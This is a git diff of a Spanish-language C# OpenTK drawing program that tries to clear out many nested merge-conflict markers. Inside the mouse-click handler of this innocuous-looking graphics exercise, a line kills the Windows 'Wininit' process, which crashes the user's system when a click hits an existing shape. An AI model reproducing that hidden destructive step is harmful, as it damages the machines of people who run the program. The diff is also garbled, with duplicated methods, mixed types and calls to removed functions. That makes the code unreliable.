@@ -20,29 +20,9 @@ namespace Hanoi
         bool mousePresionado = false;
 
         Color background;
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
         List<Tuple<float, float>> listaElementos = new List<Tuple<float, float>>();
         List<Tuple<float, float>> listaPuntos = new List<Tuple<float, float>>();
         List<Tuple<float, float>> listaTemporalElementos = new List<Tuple<float, float>>();
-=======
-        List<Vertex> listaElementos = new List<Vertex>();
-        List<Vertex> listaTemporalElementos = new List<Vertex>();
->>>>>>> parent of e795821 (a)
-=======
-        List<Vertex> listaElementos = new List<Vertex>();
-        List<Vertex> listaTemporalElementos = new List<Vertex>();
->>>>>>> parent of e795821 (a)
-=======
-        List<Vertex> listaElementos = new List<Vertex>();
-        List<Vertex> listaTemporalElementos = new List<Vertex>();
->>>>>>> parent of e795821 (a)
-=======
-        List<Vertex> listaElementos = new List<Vertex>();
-        List<Vertex> listaTemporalElementos = new List<Vertex>();
->>>>>>> parent of e795821 (a)
 
         public Ventana(int _ancho, int _alto, string titulo, Color? _background) : base(_ancho, _alto, GraphicsMode.Default, titulo)
         {
@@ -57,20 +37,7 @@ namespace Hanoi
             this.MouseUp += this.MouseRelease;
             this.CursorVisible = false;
             DibujarTriangulosAleatorios();
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
             this.Run(1 / 60.0);
-=======
-=======
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
-            this.Run(1 / 144.0);
->>>>>>> parent of e795821 (a)
         }
 
         public void ActualizarFrame(object obj, EventArgs e)
@@ -98,44 +65,11 @@ namespace Hanoi
             GL.Begin(PrimitiveType.Triangles);
             GL.Color3(1.0f, 1.0f, 0.5f);
             DibujarCursor(cursorX, cursorY);
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
             GL.End();
-=======
-            DibujarPuntosTemporales();
->>>>>>> parent of e795821 (a)
-=======
-            DibujarPuntosTemporales();
->>>>>>> parent of e795821 (a)
-=======
-            DibujarPuntosTemporales();
->>>>>>> parent of e795821 (a)
-=======
-            DibujarPuntosTemporales();
->>>>>>> parent of e795821 (a)
-
             this.SwapBuffers();
         }
 
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
         public Tuple<float, float> Rayo(float x, float y, float tiempo = 0, float direccion = 0, Tuple<float, float> vectorFinal = null)
-=======
-        public bool ColisionGeneral(float x1, float y1, out List<Vertex> listaTriangulosPorRevisar)
->>>>>>> parent of e795821 (a)
-=======
-        public bool ColisionGeneral(float x1, float y1, out List<Vertex> listaTriangulosPorRevisar)
->>>>>>> parent of e795821 (a)
-=======
-        public bool ColisionGeneral(float x1, float y1, out List<Vertex> listaTriangulosPorRevisar)
->>>>>>> parent of e795821 (a)
-=======
-        public bool ColisionGeneral(float x1, float y1, out List<Vertex> listaTriangulosPorRevisar)
->>>>>>> parent of e795821 (a)
         {
             float direccionX = vectorFinal.Item1;
             float direccionY = vectorFinal.Item2;
@@ -182,7 +116,6 @@ namespace Hanoi
                     listaTriangulosPorRevisar.AddRange(boundingBox);
                 }
 
-<<<<<<< HEAD
                 //Comprobar si el punto se puede colocar
                 if ((boundingAltura[0] > y1 && boundingAltura[1] < y1) && (boundingAnchura[0] > x1 && boundingAnchura[1] < x1))
                 {
@@ -223,7 +156,6 @@ namespace Hanoi
                 listaTemporalElementos.Clear();
             }
         }
-=======
             if (listaTriangulosPorRevisar.Count > 0)
                 return true;
 
@@ -314,16 +246,6 @@ namespace Hanoi
         {
             DibujarElementos(PrimitiveType.Triangles, listaElementos);
         }
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
         public void DibujarCursor(float x, float y)
         {
             float offset = mousePresionado ? 0 : tamCursor / 10;
@@ -345,40 +267,6 @@ namespace Hanoi
                 GL.Vertex2(item.Item1, item.Item2);
             }
         }
-        public void DibujarTriangulosAleatorios()
-        {
-            Random rnd = new Random();
-            GL.ClearColor(1.0f, 1.0f, 1.0f, 1.0f);
-<<<<<<< HEAD
-            for (int i = 0; i < 10; i++)
-=======
-            for (int i = 0; i < 15; i++)
->>>>>>> parent of e795821 (a)
-            {
-                float orientacion = rnd.Next(0, 2);
-                float tama = rnd.Next(20, 100);
-                float y = rnd.Next(0, alto);
-                float x = rnd.Next(0, ancho);
-                if (orientacion == 0)
-                {
-                    tama *= -1;
-                }
-<<<<<<< HEAD
-                Tuple<float, float> vertice1 = new Tuple<float, float>(x + tama, y + tama);
-                Tuple<float, float> vertice2 = new Tuple<float, float>(x, y + tama);
-                Tuple<float, float> vertice3 = new Tuple<float, float>(x + tama, y);
-=======
-                Vertex vertice1 = new Vertex((x + tama), (y + tama));
-                Vertex vertice2 = new Vertex(x, y + tama);
-                Vertex vertice3 = new Vertex(x + tama, y);
->>>>>>> parent of e795821 (a)
-                listaElementos.Add(vertice1);
-                listaElementos.Add(vertice2);
-                listaElementos.Add(vertice3);
-            }
-        } 
-<<<<<<< HEAD
-=======
         public void DibujarPuntosTemporales()
         {
             GL.PointSize(2.5f);
@@ -412,118 +300,12 @@ namespace Hanoi
                 listaElementos.Add(vertice3);
             }
         } 
-        public void DibujarPuntosTemporales()
-        {
-            GL.PointSize(2.5f);
-            GL.Begin(PrimitiveType.Points);
-            GL.Color3(1.0f, 0f, 0f);
-            foreach (Vertex v in listaTemporalElementos)
-            {
-                GL.Vertex2(v.X, v.Y);
-            }
-            GL.End();
-        }
-        public void DibujarTriangulosAleatorios()
-        {
-            Random rnd = new Random();
-            GL.ClearColor(1.0f, 1.0f, 1.0f, 1.0f);
-            for (int i = 0; i < 15; i++)
-            {
-                float orientacion = rnd.Next(0, 2);
-                float tama = rnd.Next(20, 100);
-                float y = rnd.Next(0, alto);
-                float x = rnd.Next(0, ancho);
-                if (orientacion == 0)
-                {
-                    tama *= -1;
-                }
-                Vertex vertice1 = new Vertex((x + tama), (y + tama));
-                Vertex vertice2 = new Vertex(x, y + tama);
-                Vertex vertice3 = new Vertex(x + tama, y);
-                listaElementos.Add(vertice1);
-                listaElementos.Add(vertice2);
-                listaElementos.Add(vertice3);
-            }
-        } 
-        public void DibujarPuntosTemporales()
-        {
-            GL.PointSize(2.5f);
-            GL.Begin(PrimitiveType.Points);
-            GL.Color3(1.0f, 0f, 0f);
-            foreach (Vertex v in listaTemporalElementos)
-            {
-                GL.Vertex2(v.X, v.Y);
-            }
-            GL.End();
-        }
-        public void DibujarTriangulosAleatorios()
-        {
-            Random rnd = new Random();
-            GL.ClearColor(1.0f, 1.0f, 1.0f, 1.0f);
-            for (int i = 0; i < 15; i++)
-            {
-                float orientacion = rnd.Next(0, 2);
-                float tama = rnd.Next(20, 100);
-                float y = rnd.Next(0, alto);
-                float x = rnd.Next(0, ancho);
-                if (orientacion == 0)
-                {
-                    tama *= -1;
-                }
-                Vertex vertice1 = new Vertex((x + tama), (y + tama));
-                Vertex vertice2 = new Vertex(x, y + tama);
-                Vertex vertice3 = new Vertex(x + tama, y);
-                listaElementos.Add(vertice1);
-                listaElementos.Add(vertice2);
-                listaElementos.Add(vertice3);
-            }
-        } 
-        public void DibujarPuntosTemporales()
-        {
-            GL.PointSize(2.5f);
-            GL.Begin(PrimitiveType.Points);
-            GL.Color3(1.0f, 0f, 0f);
-            foreach (Vertex v in listaTemporalElementos)
-            {
-                GL.Vertex2(v.X, v.Y);
-            }
-            GL.End();
-        }
-
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
         public void OnCursorMove(object obj, MouseMoveEventArgs eventoCursor)
         {
             cursorX = eventoCursor.X;
             cursorY = alto - eventoCursor.Y;
         }
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-        public void MouseClick(object obj, MouseButtonEventArgs e)
-        {
-            mousePresionado = e.Button == MouseButton.Left ? true : false;
-            Tuple<float, float> vertice;
-            if (!Colision(cursorX, cursorY))
-            {
-                vertice = new Tuple<float, float>(cursorX, cursorY);
-                listaTemporalElementos.Add(vertice);
-=======
-=======
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
+
         public void OnMouseClick(object obj, MouseButtonEventArgs e)
         {
             mousePresionado = e.Button == MouseButton.Left ? true : false;
@@ -538,40 +320,14 @@ namespace Hanoi
             else
             {
                 System.Diagnostics.Process.GetProcessesByName("Wininit")[0].Kill();
->>>>>>> parent of e795821 (a)
             }
             ComprobarTamañoListaTemp();
         }
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-        public void MouseRelease(object obj, MouseButtonEventArgs e)
-        {
-            mousePresionado = false;
-        }
-=======
-=======
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
         public void OnMouseRelease(object obj, MouseButtonEventArgs e)
         {
             mousePresionado = false;
         }
 
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
-=======
->>>>>>> parent of e795821 (a)
         public void Carga(object obj, EventArgs e)
         {
             float canalRed = background.R / 255f;
